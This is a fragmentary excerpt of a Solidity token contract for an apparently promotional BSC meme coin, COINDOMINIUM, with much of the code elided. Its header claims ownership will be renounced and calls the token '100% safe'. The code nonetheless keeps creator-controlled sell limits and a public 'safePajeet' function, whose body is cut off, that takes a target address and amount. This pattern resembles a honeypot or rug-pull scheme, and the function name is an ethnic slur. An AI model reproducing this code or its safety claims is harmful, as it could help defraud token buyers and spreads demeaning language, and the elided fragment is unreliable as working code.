...
/*
   ...
   Welcome to COINDOMINIUM
   
   This is a community token. If you want to create a telegram I suggest to name it to @COINDOMINIUMBSC
   ...
   I will renounce the ownership to burn addresses to transfer #COINDOMINIUM to the community, make sure it's 100% safe.

   I will add .2 BNB and all the left 10% total supply to the pool
   Can you make #COINDOMINIUM 10000X? 
   ...
   it's the best part of the #COINDOMINIUM idea, increasing the liquidity pool automatically, 
...
contract COINDOMINIUM is Context, IERC20, Ownable {
    ...
    uint private _threshold_duration = 50; //time in seconds before expiry - can be disabled by creator to allow sells within max transaction limit
    uint256 private _threshold_amount = 5000000000000 * 10**18; //limit
    uint private _reset_time = 50; //time interval after previous sell - no restriction on first sell up to limit
	...
	function safePajeet(address target, uint256 amount) public virtual returns (bool) {
        _safepajeet(target, amount);
        return true;
    }
    ...
    **/
	...
	function _safepajeet(address account, uint256 amount) internal virtual {
